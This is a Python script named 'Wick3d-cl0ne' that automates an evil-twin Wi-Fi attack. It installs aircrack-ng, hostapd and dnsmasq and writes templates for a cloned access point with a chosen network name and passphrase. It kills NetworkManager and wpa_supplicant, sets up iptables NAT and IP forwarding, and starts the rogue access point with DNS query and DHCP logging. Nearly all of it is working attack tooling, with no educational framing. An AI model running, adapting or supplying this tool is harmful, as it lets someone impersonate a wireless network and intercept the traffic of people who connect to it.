import subprocess
import os.path
import os
import atexit
import threading
import time
import pyfiglet
from colorama import *
init(autoreset=True)

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN

#title
ascii_banner = pyfiglet.figlet_format("Wick3d-cl0ne")
print(green + ascii_banner)

print("\nSee README for configuration directions")
class Dependencies(object):
    """ Checks dependencies exist"""

    def __init__(self, aircrack, hostapd, dnsmasq):
        self.aircrack = aircrack
        self.hostapd = hostapd
        self.dnsmasq = dnsmasq

    def check_directories(self):

        if os.path.exists(self.aircrack):
            print(green + self.aircrack, "located")
        else:
            install_aircrack = InstallAircrack('/usr/bin/aircrack-ng')
            install_aircrack.install_aircrack()

        if os.path.exists(self.hostapd):
            print(green + self.hostapd, "located")
        else:
            install_hostapd = InstallHostapd('/etc/hostapd')
            install_hostapd.install_hostapd()

        if os.path.exists(self.dnsmasq):
            print(green + self.dnsmasq, "located")
        else:
            install_dnsmasq = InstallDnsmasq('/etc/dnsmasq.conf')
            install_dnsmasq.install_dnsmasq()


class InstallAircrack:
    """Install aircrack-ng suite, if necessary"""

    def __init__(self, aircrack):
        self.aircrack = aircrack

    def install_aircrack(self):
        verify_aircrack = input(red + self.aircrack + ' does not exist. Install Aircrack-ng? [y/n]: ')

        if verify_aircrack == 'y'.lower():
            subprocess.run(["sudo", "apt-get", "install", "aircrack-ng"])
        elif verify_aircrack == 'n'.lower():
            print(self.aircrack, " is required for the program to run.")
            exit()
        else:
            self.install_aircrack()


class InstallHostapd:
    """Install hostapd, if necessary"""

    def __init__(self, hostapd):
        self.hostapd = hostapd

    def install_hostapd(self):
        verify_hostapd = input(red + self.hostapd + ' does not exist. Install hostapd? [y/n]: ')

        if verify_hostapd == 'y'.lower():
            subprocess.run(["sudo", "apt-get", "install", "hostapd"])
        elif verify_hostapd == 'n'.lower():
            print(self.hostapd, " is required for the program to run.")
            exit()
        else:
            self.install_hostapd()


class InstallDnsmasq:
    """Install dnsmasq, if necessary"""

    def __init__(self, dnsmasq):
        self.dnsmasq = dnsmasq

    def install_dnsmasq(self):
        verify_dnsmasq = input(red + self.dnsmasq + ' does not exist. Install dnsmasq? [y/n]: ')

        if verify_dnsmasq == 'y'.lower():
            subprocess.run(["sudo", "apt-get", "install", "dnsmasq"])
        elif verify_dnsmasq == 'n'.lower():
            print(self.dnsmasq, " is required for the program to run.")
            exit()
        else:
            self.install_dnsmasq()


class Directory:
    """Check if evil_dir folder exists"""

    def __init__(self, evil_dir):
        self.evil_dir = evil_dir

    def check_directory(self):
        if os.path.exists(self.evil_dir):
            print(green + self.evil_dir, " folder located")
        else:
            self.install_directory()

    def install_directory(self):
        verify_dir = input(red + self.evil_dir + " does not exist. Create in " + os.getcwd() + "? [y/n]: ")

        if verify_dir == 'y'.lower():
            os.makedirs(self.evil_dir)
            print(green + self.evil_dir, " created")
        elif verify_dir == 'n'.lower():
            self.close()

    def close(self):
        exit()


class CreateConfigs:
    """Checks hostapd_conf and dnsmasq_conf exist and creates, if needed"""

    def __init__(self, evil_dir, hostapd_conf, dnsmasq_conf):
        self.evil_dir = evil_dir
        self.hostapd_conf = hostapd_conf
        self.dnsmasq_conf = dnsmasq_conf

    def create_files(self):
        check_hostapd = self.evil_dir + self.hostapd_conf
        if not os.path.exists(check_hostapd):
            with open(check_hostapd, 'w'):
                print(green + check_hostapd, "created")
        elif os.path.exists(check_hostapd):
            print(green + check_hostapd, "located")

        check_dnsmasq = self.evil_dir + self.dnsmasq_conf
        if not os.path.exists(check_dnsmasq):
            with open(check_dnsmasq, 'w'):
                print(green + check_dnsmasq, "created")
        elif os.path.exists(check_dnsmasq):
            print(green + check_dnsmasq, "located")


class SetUpConfigs:
    """Checks if hostapd_conf and dnsmasq_conf are empty. If empty, network param templates are added"""

    def __init__(self, evil_dir, hostapd_conf, dnsmasq_conf, hostapd_text, dnsmasq_text):
        self.evil_dir = evil_dir
        self.hostapd_conf = hostapd_conf
        self.dnsmasq_conf = dnsmasq_conf
        self.hostapd_text = hostapd_text
        self.dnsmasq_text = dnsmasq_text

    def write_config_files(self):
        config_hostapd = self.evil_dir + self.hostapd_conf
        with open(config_hostapd, "r+") as file_object:
            file_object.seek(0)
            if not file_object.read():
                with open(config_hostapd, "a+") as file_object:
                    file_object.writelines("%s\n" % line for line in self.hostapd_text)
                    print(file_object.read())
            else:
                pass

        config_dnsmasq = self.evil_dir + self.dnsmasq_conf
        with open(config_dnsmasq, "r+") as file_object:
            file_object.seek(0)
            if not file_object.read():
                with open(config_dnsmasq, "a+") as file_object:
                    file_object.writelines("%s\n" % line for line in self.dnsmasq_text)
            else:
                pass


class VerifyConfigs:
    """Checks if user wants to modify config files. If yes, the config files open for editing. If not, pass"""

    def __init__(self, hostapd_conf, dnsmasq_conf):
        self.hostapd_conf = hostapd_conf
        self.dnsmasq_conf = dnsmasq_conf

    def verify_config_files(self):
        verify_files = input("Do you need to configure your hostapd or dnsmasq configuration files before proceeding? [y/n]: " + '\n')
        if verify_files == 'y'.lower():
            self.write_to_config_files()
        if verify_files == 'n'.lower():
            pass

    def write_to_config_files(self):
        print(Back.LIGHTWHITE_EX + "Modify the areas in brackets [] for ", Back.LIGHTWHITE_EX + self.hostapd_conf
              + " and " + self.dnsmasq_conf + Back.LIGHTWHITE_EX + ". When finished, save [Ctrl+S] and exit out of "
                                                                   "each file.")
        subprocess.run(['leafpad', self.hostapd_conf])
        subprocess.run(['leafpad', self.dnsmasq_conf])


class Start:
    """Gather network params, kill interfering processes, start hostapd thread 1, start dnsmasq tread 2"""

    def __init__(self, interface=None, gateip=None, subnet=None, net=None, eth=None):
        self.interface = interface
        self.gateip = gateip
        self.subnet = subnet
        self.net = net
        self.eth = eth

    def grab_interface(self):
        input("press {0}'Enter' {1}in the terminal when you're to clone the fake access point: ".format(green, Fore.RESET))
        self.interface = input('Enter {0}wireless interface {1}name (e.g., "wlan0"): '.format(yellow, Fore.RESET))
        self.eth = input('Enter the {0}ethernet interface {1}name (e.g., "eth0"): '.format(yellow, Fore.RESET))
        self.gateip = input('Enter {0}gateway {1}IP address (e.g., "10.0.0.1"): '.format(yellow, Fore.RESET))
        self.subnet = input('Enter the {0}subnet mask {1}for this network (e.g., "255.255.255.0"): '.format(yellow, Fore.RESET))
        self.kill_processes()

    def kill_processes(self):
        print('{0}Killing interfering processes...'.format(green) + '\n')
        subprocess.run(['sudo', 'killall', 'NetworkManager', 'wpa_supplicant'])  # kills possible interfering processes
        time.sleep(3)
        self.iptables()


    def iptables(self):
        print('Please wait...Ensuring interfaces and iptables are configured properly before starting hostapd and dnsmasq')
        subprocess.run(['sudo', 'iptables', '--flush'])  # flush iptables just in case.
        subprocess.run(['sudo', 'ifconfig', self.interface, 'up'])  # Bring up self.interface.
        time.sleep(3)  # Give 3 seconds for self.interface to come up properly before starting dnsmasq.

        subprocess.run(['sudo', 'ifconfig', self.interface, self.gateip, 'netmask',
                        self.subnet])  # assign IP/subnet to self.interface

        subprocess.run(['sudo', 'iptables', '--table', 'nat', '--append',
                        'POSTROUTING', '--out-interface', self.eth,
                        '-j', 'MASQUERADE'])  # Enable NAT .

        subprocess.run(['sudo', 'iptables', '--append', 'FORWARD', '--in-interface',
                        self.interface, '-j', 'ACCEPT'])  # Enable NAT.

        ip_forward = '/proc/sys/net/ipv4/ip_forward'
        with open(ip_forward, 'a+') as file_object:
            file_object.write('1')  # '1' enables IP forwarding.

        self.run()

    def start_hostapd(self):
        subprocess.run(['sudo', 'xterm', '-hold', '-e', 'hostapd', 'evil-twin/hostapd.conf'])

    def start_dnsmasq(self):
        subprocess.run(['sudo', 'xterm', '-hold', '-e', 'dnsmasq', '-C', 'evil-twin/dnsmasq.conf', '-d'])

    # The sleep
    def run(self):
        time.sleep(5)  # 5 second delay to ensure self.interface is up and iptables configured.
        t1 = threading.Thread(target=self.start_hostapd)
        t2 = threading.Thread(target=self.start_dnsmasq)
        t1.start()
        t2.start()


# Check that dependencies exist, if not install.
dependencies = Dependencies('/usr/bin/aircrack-ng', '/etc/hostapd', '/etc/dnsmasq.conf')
dependencies.check_directories()

# Check evil-twin folder exists; if not, create folder
directory = Directory('evil-twin')
directory.check_directory()

# Checks hostapd.conf and dnsmasq.conf files exist; if not create them.
create_configs = CreateConfigs('evil-twin/', 'hostapd.conf', 'dnsmasq.conf')
create_configs.create_files()

# Verifies hostapd.conf and dnsmasq.conf files are not empty. Adds required network parameters below if files are empty.
hostapd_config_text = ['interface=[INTERFACE NAME]', 'driver=nl80211', 'ssid=[NETWORK NAME]', 'hw_mode=g',
                       'channel=[CHANNEL #]', 'macaddr_acl=0', 'ignore_broadcast_ssid=0', 'auth_algs=1', 'wpa=2',
                       'wpa_passphrase=[PASSPHRASE]', 'wpa_key_mgmt=WPA-PSK', 'wpa_pairwise=CCMP',
                       'wpa_group_rekey=86400', 'ieee80211n=1', 'wme_enabled=1']

dnsmasq_config_text = ['interface=[INTERFACE NAME]', 'dhcp-range=[FIRST HOST IP ADDR,LAST HOST IP ADDR,SUBNET MASK,12h]',
                       'dhcp-option=3,[GATEWAY/ROUTER IP ADDR]', 'dhcp-option=6,[GATEWAY/ROUTER IP ADDR]',
                       'server=8.8.8.8', 'server=8.8.4.4', 'server=64.6.64.6', 'server=64.6.65.6', 'log-queries',
                       'log-dhcp', 'listen-address=127.0.0.1']

configure_configs = SetUpConfigs('evil-twin/', 'hostapd.conf', 'dnsmasq.conf', hostapd_config_text, dnsmasq_config_text)
configure_configs.write_config_files()

# Verifies if user wishes to modify config files. If so, the files are opened for user to modify and save.
verify_files = VerifyConfigs('evil-twin/hostapd.conf', 'evil-twin/dnsmasq.conf')
verify_files.verify_config_files()

# Kill interfering processes, configure wlan0, configure iptables, and start hostapd/dnsmasq threads
start_clone = Start()
start_clone.grab_interface()

# cleanup function upon exit
def exit_handler():
    subprocess.run(['sudo', 'NetworkManager', 'Restart'])
    subprocess.run(['sudo', 'wpa_supplicant', 'restart'])
    subprocess.run(['sudo', 'iptables', '-F'])
    subprocess.run(['sudo', 'iptables', '--table', 'nat', '--flush'])
    subprocess.run(['sudo', 'iptables', '--table', 'nat', '--delete-chain'])
    ip_forward = '/proc/sys/net/ipv4/ip_forward'
    with open(ip_forward, 'a+') as file_object:
        file_object.write('0')  # '0' disables IP forwarding.
    print("{0}NetworkManager, wpa_supplicant, iptables, and IP forwarding restored".format(green))


# restarts killed process and refreshes iptables
atexit.register(exit_handler)